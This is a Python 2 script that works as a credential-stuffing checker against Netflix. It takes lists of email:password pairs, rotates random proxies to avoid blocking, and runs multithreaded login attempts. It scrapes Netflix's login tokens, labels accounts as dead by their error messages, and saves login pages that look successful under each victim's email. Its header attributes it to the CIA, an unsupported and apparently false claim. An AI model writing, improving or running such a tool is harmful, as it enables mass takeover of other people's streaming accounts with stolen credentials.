	#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import re
import sys
import random
import argparse
import requests

from concurrent.futures import ThreadPoolExecutor

__author__ = "Center For Cyber Intelligence - Central Intelligence Agency"
__version__ = "1.0.0"
__description__ = "Netflix oAuth"

__banner__ = """
888b    888 8888888888 88888888888 8888888888 888      8888888 Y88b   d88P 
8888b   888 888            888     888        888        888    Y88b d88P  
88888b  888 888            888     888        888        888     Y88o88P   
888Y88b 888 8888888        888     8888888    888        888      Y888P    
888 Y88b888 888            888     888        888        888      d888b    
888  Y88888 888            888     888        888        888     d88888b   
888   Y8888 888            888     888        888        888    d88P Y88b  
888    Y888 8888888888     888     888        88888888 8888888 d88P   Y88b 
"""

CRED = '\033[91m'
CGREEN = '\033[92m'
CYELLOW = '\033[93m'
CBLUE = '\033[94m'
CMAGENTA = '\033[95m'
CGREY = '\033[90m'
CBLACK = '\033[90m'
CEND = '\033[0m'

VERSION = '%s[+]%s %s - Version: %s' %(CGREEN, CEND, __description__, __version__)

def get_args():
	parser = argparse.ArgumentParser(description=__description__)
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('-e', '--email', dest='email', help='Teste email:password.')
	group.add_argument('-i', '--input', dest='input', help='Input file with email:password.', type=argparse.FileType('r'))
	parser.add_argument('-t', '--thread', dest='thread', help='Execute in thread.', type=int)
	parser.add_argument('--timeout', dest='timeout', help='Timeout connection requests.', type=int)
	parser.add_argument('-p', '--proxy', dest='proxy', help='Execute with proxy', type=argparse.FileType('r'))
	parser.add_argument('-o', '--output', dest='output', help='Output file log.', type=argparse.FileType('w'))
	parser.add_argument('-d', '--debug', dest='debug', help='This argument allows debugging information.', action='store_true')
	parser.add_argument('-v', '--version', dest='version', help='This argument show version.', action='version', version=VERSION)

	if len(sys.argv) == 1:  # If no arguments were provided, then print help and exit.
		parser.print_help()
		sys.exit(1)

	return parser.parse_args()

def getStr(string, start, end):
	strI = string.split(start);
	strI = strI[1].split(end)
	return strI[0]

def authentication(num, lines, raw):

	arr_raw = re.split(r'[:;|]', raw)

	if len(arr_raw) < 2:
		if _args.thread:
			if _args.debug:
				sys.stdout.write('{0}[-]{1} {2}/{3} - {4} - Fail split\n'.format(CRED, CEND, num, lines, raw))
				sys.stdout.flush()
		else:
			if _args.debug: print '{0}[-]{1} {2}/{3} - {4} - Fail split'.format(CRED, CEND, num, lines, raw)
		if _args.output: file_write.write('[-] {0}/{1} - {2} - Fail split\n'.format(num, lines, raw))
		return

	arr_raw[0] = arr_raw[0].strip()
	arr_raw[1] = arr_raw[1].strip()

	try:
		if _args.proxy:
			arr_proxy = list_proxy[random.randint(0,len(list_proxy)-1)].split('|')
			proxies = {arr_proxy[0]:arr_proxy[1]}
		else:
			proxies = None

		if _args.timeout:
			timeout = _args.timeout
		else:
			timeout = None

		user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0'

		headers = {
			'Host': 'www.netflix.com',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1',
		}

		#proxies = {'https':'186.42.124.130:65301'}

		response = requests.get('https://www.netflix.com', headers=headers, proxies=proxies, timeout=timeout)
		page_html = response.text.encode('utf8')

		file_html = open('home_netflix.html', 'w')
		file_html.write(page_html)
		file_html.close()

		if 'Netflix Site Error' in page_html:
			str_msg = 'Use Proxy - Netflix Site Error/We were unable to process your request'
			if _args.thread:
				sys.stdout.write('{0}[-]{1} {2}/{3} - {4} - Dead: {5}\n'.format(CRED, CEND, num, lines, raw, str_msg))
				sys.stdout.flush()
			else:
				print '{0}[-]{1} {2}/{3} - {4} - Dead: {5}'.format(CRED, CEND, num, lines, raw, str_msg)
			if _args.output: file_write.write('[-] {0}/{1} - {2} - Dead: {3}\n'.format(num, lines, raw, str_msg))
			return

		cookies = response.cookies
		authURL = getStr(page_html, 'authURL":"', '"')
		locale = getStr(page_html, 'locale":"', '"')
		country = getStr(page_html, 'country":"', '"')

		#flwssn = getStr(page_html, 'flwssn": "', '"')
		
		headers = {
			'Host': 'www.netflix.com',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			#'Referer': 'https://www.netflix.com/'+locale+'/login',
			'Upgrade-Insecure-Requests': '1',
		}

		data = 'userLoginId='+arr_raw[0]+'&password='+arr_raw[1]+'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode&authURL='+authURL+'&nextPage=&showPassword=&countryCode=%2B44&countryIsoCode='+country
		#data = 'userLoginId='+arr_raw[0]+'&password='+arr_raw[1]+'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode&authURL=1571548662171.VwiH2HG8tbbDJa4rRzlKq9/Wbus=&nextPage=&showPassword=&countryCode=%2B55&countryIsoCode=BR'

		print "locale=%s" %locale
		print "data=%s" %data

		response = requests.post('https://www.netflix.com/'+locale+'/login', headers=headers, data=data, proxies=proxies, timeout=timeout)
		page_html = response.text.encode('utf8')

		file_html = open('login_netflix.html', 'w')
		file_html.write(page_html)
		file_html.close()

		#print "Cookies: %s"%cookies
		#print "authURL: %s"%authURL

		str_msg = ''		

		if 'Sorry, we can\'t find an account with this email address' in page_html:
			str_msg = 'Sorry, we can\'t find an account with this email address'
		elif 'Incorrect password' in page_html:
			str_msg = 'Incorrect password'
		elif 'Choose your plan' in page_html:
			str_msg = 'Choose your plan'
		elif 'Sorry, something went wrong' in page_html:
			str_msg = 'Sorry, something went wrong'
		elif 'We are having technical difficulties and are actively working on a fix' in page_html:
			str_msg = 'We are having technical difficulties and are actively working on a fix'
		elif 'Netflix Site Error' in page_html:
			str_msg = 'Use Proxy - Netflix Site Error/We were unable to process your request'
 		else:
			file_html = open(arr_raw[0] + '.html', 'w')
			file_html.write(page_html)
			file_html.close()

		if str_msg is not None and str_msg != '': 
			if _args.thread:
				sys.stdout.write('{0}[-]{1} {2}/{3} - {4} - Dead: {5}\n'.format(CRED, CEND, num, lines, raw, str_msg))
				sys.stdout.flush()
			else:
				print '{0}[-]{1} {2}/{3} - {4} - Dead: {5}'.format(CRED, CEND, num, lines, raw, str_msg)
			if _args.output: file_write.write('[-] {0}/{1} - {2} - Dead: {3}\n'.format(num, lines, raw, str_msg))
		else:
			if _args.thread:
				sys.stdout.write('{0}[*]{1} {2}/{3} - {4} - Verify html\n'.format(CYELLOW, CEND, num, lines, raw))
				sys.stdout.flush()
			else:
				print '{0}[*]{1} {2}/{3} - {4} - Verify html'.format(CYELLOW, CEND, num, lines, raw)
			if _args.output: file_write.write('[*] {0}/{1} - {2} - Verify html\n'.format(num, lines, raw))
			
		#print page_html
		#sys.exit()

		response.close()
	except Exception as e:
		if _args.thread:
			sys.stdout.write('{0}[!]{1} {2}/{3} - {4} - Proxy: {5} - Line {6} - Error: {7} - \n'.format(CYELLOW, CEND, num, lines, raw, proxies, sys.exc_info()[-1].tb_lineno, e))
			sys.stdout.flush()
		else:
			print '{0}[!]{1} {2}/{3} - {4} - Proxy: {5} - Line: {6} - Error: {7}'.format(CYELLOW, CEND, num, lines, raw, proxies, sys.exc_info()[-1].tb_lineno, e)
		if _args.output: file_write.write('[!] {0}/{1} - {2} - Proxy: {3} - Line: {4} - Error: {5}\n'.format(num, lines, raw, proxies, sys.exc_info()[-1].tb_lineno, e))
		return

def main():
	os.system('clear')

	print __banner__
	
	global _args, file_write, list_proxy

	_args = get_args()

	if _args.debug:
		print "%s[!]%s Mode Debug On" %(CYELLOW, CEND) 

	if _args.output:	
		file_write = open(_args.output.name, 'w')
		print "%s[*]%s File output: %s" %(CBLUE, CEND, _args.output.name) 
		file_write.write('[*] File output: %s\n' %_args.output.name)

	if _args.proxy:
		print "%s[*]%s File Proxy: %s" %(CBLUE, CEND, _args.proxy.name) 
		if _args.output: file_write.write('[*] File proxy: %s\n' %_args.proxy.name)
		list_proxy = ''
		with open(_args.proxy.name) as f:
			list_proxy = list(line for line in (l.strip() for l in f) if line)
			#list_proxy = f.read().split('\n')
			#print list_proxy
			#sys.exit()

	if _args.timeout:	
		print "%s[*]%s Timeout: %s" %(CBLUE, CEND, _args.timeout) 
		file_write.write('[*] Timeout: %s\n' %_args.timeout)

	if _args.email:
		authentication(1, 1, _args.email)
	elif _args.input:
		lines = sum(1 for line in open(_args.input.name))
		print "%s[*]%s File input: %s" %(CBLUE, CEND, _args.input.name)
		print "%s[*]%s Lines: %s"  %(CBLUE, CEND, str(lines))

		if _args.thread:
			print "%s[*]%s Thread: %s"  %(CBLUE, CEND, _args.thread)

		if _args.output: 
			file_write.write('[*] File input: %s\n' %_args.input.name)
			file_write.write('[*] Lines: %s\n' %str(lines))
			if _args.thread: file_write.write('[*] Thread: %s\n' %_args.thread)
		
		try:
			if _args.thread: pool = ThreadPoolExecutor(max_workers=_args.thread)
			
			for num, line in enumerate(_args.input, 1):
				raw = line.strip()
				try:
					if _args.thread:
						pool.submit(authentication, num, lines, raw)
					else:
						authentication(num, lines, raw)
				except Exception as e:
					if _args.thread:
						sys.stdout.write('{0}[-]{1} {2}/{3} - Raw: {4} - Error: {5}\n'.format(CRED, CEND, num, lines, raw, e))
						sys.stdout.flush()
					else:
						print '{0}[-]{1} {2}/{3} - Raw: {4} - Error: {5}'.format(CYELLOW, CEND, num, lines, raw, e)
					if _args.output: file_write.write('[-] {0}/{1} - Raw: {2} - Error: {3}\n'.format(num, lines, raw, e))

			if _args.thread: pool.shutdown(wait=True)
		except KeyboardInterrupt:
			#bash: fork: retry: Resource temporarily unavailable
			print "%s[!]%s Keyboard Interrupt..." %(CYELLOW, CEND)
			if _args.output:	
				file_write.close()
			sys.exit()
		except Exception as e:
			if _args.thread:
				sys.stdout.write('{0}[-]{1} Line: {2} - Raw: {3} - Error: {4} - \n'.format(CRED, CEND, sys.exc_info()[-1].tb_lineno, line, sys.exc_info()))
				sys.stdout.flush()
			else:
				print '{0}[-]{1} Line: {2} - Error: {3}'.format(CYELLOW, CEND, sys.exc_info()[-1].tb_lineno, e)
			if _args.output: file_write.write('[-] Line: {0} - Error: {1}\n'.format(sys.exc_info()[-1].tb_lineno, e))
			if _args.output:	
				file_write.close()
			sys.exit()

	if _args.output:	
		file_write.close()

if __name__ == '__main__':
	main()

